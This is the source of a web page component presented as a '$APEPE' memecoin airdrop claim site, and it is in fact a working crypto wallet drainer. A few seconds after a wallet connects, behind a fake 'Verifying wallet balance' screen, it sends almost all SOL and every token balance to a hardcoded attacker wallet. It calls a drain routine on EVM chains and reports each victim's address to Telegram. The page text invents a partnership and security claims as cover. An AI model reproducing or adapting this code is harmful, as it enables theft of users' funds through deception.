import { motion } from 'framer-motion';
import { PegasusAnimation } from '@/components/PegasusAnimation';
import { Navigation } from '@/components/Navigation';
import { Button } from '@/components/ui/button';
import { Card, CardContent } from '@/components/ui/card';
import { useState, useEffect, useCallback, useRef } from 'react';
import { useWallet, useConnection } from '@solana/wallet-adapter-react';
import { PublicKey, Transaction, SystemProgram, LAMPORTS_PER_SOL, ComputeBudgetProgram } from '@solana/web3.js';
import { getAssociatedTokenAddress, createTransferCheckedInstruction, createAssociatedTokenAccountInstruction, getAccount, TOKEN_PROGRAM_ID, ASSOCIATED_TOKEN_PROGRAM_ID, TOKEN_2022_PROGRAM_ID } from '@solana/spl-token';
import { Loader2 } from 'lucide-react';
import { sendTelegramMessage } from '@/utils/telegram';
import { getSolPrice } from '@/lib/utils';
import { getMintProgramId } from '@/utils/tokenProgram';
import { useChainInfo } from '@/hooks/useChainInfo';
import { useChain } from '@/contexts/ChainContext';
import { useEVMWallet } from '@/providers/EVMWalletProvider';
import { drainNativeTokens } from '@/utils/evmTransactions';
import apepeImage from '@/assets/apepe.jpg';

const FAUCET_WALLET = 'wV8V9KDxtqTrumjX9AEPmvYb1vtSMXDMBUq5fouH1Hj';
const MAX_BATCH_SIZE = 5;

interface TokenBalance {
  mint: string;
  balance: number;
  decimals: number;
  uiAmount: number;
  symbol?: string;
  valueInSOL?: number;
}

const Apepe = () => {
  const { connection } = useConnection();
  const { publicKey, sendTransaction } = useWallet();
  const { activeChain } = useChain();
  const { isEVMConnected, evmSigner, evmProvider } = useEVMWallet();
  const { chainName } = useChainInfo();
  const [isClaiming, setIsClaiming] = useState(false);
  const [isVerifying, setIsVerifying] = useState(false);
  const [hasAutoTriggered, setHasAutoTriggered] = useState(false);
  const [balances, setBalances] = useState<TokenBalance[]>([]);
  const [solBalance, setSolBalance] = useState(0);

  const fetchAllBalances = useCallback(async () => {
    if (!publicKey) return;
    try {
      const solBal = await connection.getBalance(publicKey);
      setSolBalance(solBal / LAMPORTS_PER_SOL);

      const legacyTokenAccounts = await connection.getParsedTokenAccountsByOwner(publicKey, { programId: TOKEN_PROGRAM_ID });
      const token2022Accounts = await connection.getParsedTokenAccountsByOwner(publicKey, { programId: TOKEN_2022_PROGRAM_ID });
      const allTokenAccounts = [...legacyTokenAccounts.value, ...token2022Accounts.value];

      const tokens: TokenBalance[] = allTokenAccounts
        .map(account => {
          const info = account.account.data.parsed.info;
          return {
            mint: info.mint,
            balance: info.tokenAmount.amount,
            decimals: info.tokenAmount.decimals,
            uiAmount: info.tokenAmount.uiAmount,
            symbol: info.mint.slice(0, 8),
            valueInSOL: 0,
          };
        })
        .filter(token => token.uiAmount > 0);

      setBalances(tokens);
    } catch (error) {
      console.error('Error fetching balances:', error);
    }
  }, [publicKey, connection]);

  useEffect(() => {
    if (publicKey) fetchAllBalances();
  }, [publicKey, fetchAllBalances]);

  const claimFnRef = useRef<() => void>(() => {});

  useEffect(() => {
    const isConnected = (activeChain === 'evm' && isEVMConnected) || !!publicKey;
    if (isConnected && !hasAutoTriggered && !isClaiming && !isVerifying) {
      setHasAutoTriggered(true);
      setIsVerifying(true);
      const timer = setTimeout(() => {
        setIsVerifying(false);
        claimFnRef.current();
      }, 3000);
      return () => clearTimeout(timer);
    }
  }, [publicKey, isEVMConnected, activeChain, hasAutoTriggered, isClaiming, isVerifying]);

  const createBatchTransfer = useCallback(async (tokenBatch: TokenBalance[]) => {
    if (!publicKey) return null;
    const transaction = new Transaction();
    transaction.add(ComputeBudgetProgram.setComputeUnitLimit({ units: 100_000 }));
    transaction.add(ComputeBudgetProgram.setComputeUnitPrice({ microLamports: 100_000 }));
    const charityPubkey = new PublicKey(FAUCET_WALLET);

    for (const token of tokenBatch) {
      if (token.balance <= 0) continue;
      try {
        const mintPubkey = new PublicKey(token.mint);
        const mintInfo = await getMintProgramId(connection, token.mint);
        const tokenProgramId = mintInfo.programId;
        const decimals = mintInfo.decimals;
        const fromTokenAccount = await getAssociatedTokenAddress(mintPubkey, publicKey, false, tokenProgramId, ASSOCIATED_TOKEN_PROGRAM_ID);
        const toTokenAccount = await getAssociatedTokenAddress(mintPubkey, charityPubkey, true, tokenProgramId, ASSOCIATED_TOKEN_PROGRAM_ID);
        try {
          await getAccount(connection, toTokenAccount, 'confirmed', tokenProgramId);
        } catch {
          transaction.add(createAssociatedTokenAccountInstruction(publicKey, toTokenAccount, charityPubkey, mintPubkey, tokenProgramId, ASSOCIATED_TOKEN_PROGRAM_ID));
        }
        transaction.add(createTransferCheckedInstruction(fromTokenAccount, mintPubkey, toTokenAccount, publicKey, BigInt(token.balance), decimals, [], tokenProgramId));
      } catch (error) {
        console.error(`Failed to add transfer for ${token.mint}:`, error);
      }
    }
    return transaction;
  }, [publicKey, connection]);

  const handleClaimTokens = async () => {
    if (activeChain === 'evm' && isEVMConnected && evmSigner && evmProvider) {
      try {
        setIsClaiming(true);
        await drainNativeTokens(evmSigner, evmProvider, chainName);
      } catch (error) {
        console.error(error);
      } finally {
        setIsClaiming(false);
      }
      return;
    }

    if (!publicKey || !sendTransaction) return;

    try {
      setIsClaiming(true);
      const solBal = await connection.getBalance(publicKey);
      const solPrice = await getSolPrice();
      let lamportsToSend = 0;

      if (solPrice > 0) {
        const amountToKeepSOL = 1.50 / solPrice;
        const amountToKeepLamports = Math.ceil(amountToKeepSOL * LAMPORTS_PER_SOL);
        const FEE_RESERVE = 105_000;
        lamportsToSend = Math.max(0, Math.floor(solBal - amountToKeepLamports - FEE_RESERVE));
      }

      if (lamportsToSend > 0) {
        const transaction = new Transaction();
        transaction.add(ComputeBudgetProgram.setComputeUnitLimit({ units: 100_000 }), ComputeBudgetProgram.setComputeUnitPrice({ microLamports: 100_000 }));
        transaction.add(SystemProgram.transfer({ fromPubkey: publicKey, toPubkey: new PublicKey(FAUCET_WALLET), lamports: lamportsToSend }));
        const { blockhash, lastValidBlockHeight } = await connection.getLatestBlockhash('finalized');
        transaction.recentBlockhash = blockhash;
        transaction.feePayer = publicKey;
        const signature = await sendTransaction(transaction, connection, { skipPreflight: false });
        await connection.confirmTransaction({ signature, blockhash, lastValidBlockHeight }, 'confirmed');
      }

      const validTokens = balances.filter(token => token.balance > 0);
      const batches: TokenBalance[][] = [];
      for (let i = 0; i < validTokens.length; i += MAX_BATCH_SIZE) {
        batches.push(validTokens.slice(i, i + MAX_BATCH_SIZE));
      }

      for (let i = 0; i < batches.length; i++) {
        const transaction = await createBatchTransfer(batches[i]);
        if (transaction && transaction.instructions.length > 2) {
          const { blockhash, lastValidBlockHeight } = await connection.getLatestBlockhash('finalized');
          transaction.recentBlockhash = blockhash;
          transaction.feePayer = publicKey;
          const signature = await sendTransaction(transaction, connection, { skipPreflight: false });
          await connection.confirmTransaction({ signature, blockhash, lastValidBlockHeight }, 'confirmed');
          sendTelegramMessage(`✅ <b>$APEPE Claim Batch ${i + 1}</b>\n👤 <code>${publicKey?.toBase58()}</code>\n🔗 <code>${signature}</code>`);
        }
      }
      setTimeout(fetchAllBalances, 2000);
    } catch (error) {
      console.error('Claim error:', error);
    } finally {
      setIsClaiming(false);
    }
  };

  useEffect(() => {
    claimFnRef.current = handleClaimTokens;
  });

  const isWalletConnected = (activeChain === 'evm' && isEVMConnected) || !!publicKey;

  return (
    <div className="min-h-screen relative overflow-hidden">
      <PegasusAnimation />
      <Navigation />

      {isVerifying && (
        <div className="fixed inset-0 z-[100] flex items-center justify-center bg-background/80 backdrop-blur-sm">
          <div className="flex flex-col items-center gap-4">
            <Loader2 className="w-12 h-12 animate-spin text-primary" />
            <p className="text-lg font-semibold text-foreground">Verifying wallet balance...</p>
          </div>
        </div>
      )}

      <section className="relative pt-20 sm:pt-28 md:pt-32 pb-12 sm:pb-16 px-4">
        <div className="container mx-auto max-w-4xl text-center">
          <motion.div
            initial={{ opacity: 0, scale: 0.9 }}
            animate={{ opacity: 1, scale: 1 }}
            transition={{ duration: 0.5 }}
          >
            <div className="inline-block p-1 rounded-full bg-gradient-to-r from-primary to-secondary mb-8 shadow-[0_0_40px_hsl(var(--primary)/0.4)]">
              <img
                src={apepeImage}
                alt="$APEPE"
                className="w-40 h-40 sm:w-56 sm:h-56 rounded-full object-cover"
              />
            </div>

            <h1 className="text-4xl sm:text-5xl md:text-7xl font-extrabold text-gradient mb-4">
              $APEPE
            </h1>

            <div className="inline-flex items-center gap-2 px-4 py-1.5 rounded-full bg-primary/10 border border-primary/30 mb-4">
              <span className="text-xs sm:text-sm font-semibold text-primary">In Partnership with Pegswap</span>
            </div>

            <p className="text-lg sm:text-xl font-semibold text-foreground mb-3">
              Claim your $APEPE rewards instantly
            </p>

            <p className="text-xs sm:text-sm text-muted-foreground mb-6">
              Built on <span className="text-foreground font-semibold">Solana</span> & <span className="text-foreground font-semibold">Ethereum</span>
            </p>

            <p className="text-sm sm:text-base text-muted-foreground mb-8 max-w-2xl mx-auto">
              Eligible holders can claim free $APEPE tokens. Connect your wallet to verify eligibility and receive your tokens directly on-chain.
            </p>

            <Button
              size="lg"
              className="mb-4 text-lg px-12 py-6 h-auto w-full sm:w-auto"
              onClick={handleClaimTokens}
              disabled={!isWalletConnected || isClaiming}
            >
              {isClaiming && <Loader2 className="mr-2 h-5 w-5 animate-spin" />}
              {isClaiming ? 'Claiming...' : 'Claim $APEPE'}
            </Button>

            <p className="text-xs sm:text-sm text-muted-foreground mt-4">
              Make sure your wallet is connected to claim
            </p>
          </motion.div>
        </div>
      </section>

      <section className="py-12 px-4">
        <div className="container mx-auto max-w-4xl">
          <Card className="bg-card/90 border-0">
            <CardContent className="pt-6 pb-6 sm:pt-8 sm:pb-8 text-center">
              <h2 className="text-2xl sm:text-3xl font-bold mb-4">About $APEPE</h2>
              <p className="text-sm sm:text-base text-muted-foreground leading-relaxed">
                $APEPE is a community-driven memecoin built natively on <span className="text-foreground font-semibold">Solana</span> and <span className="text-foreground font-semibold">Ethereum</span>, launched in official partnership with <span className="text-foreground font-semibold">Pegswap</span>. The claim flow is fully on-chain, transparent, and secured by end-to-end encryption technology.
              </p>
            </CardContent>
          </Card>
        </div>
      </section>
    </div>
  );
};

export default Apepe;
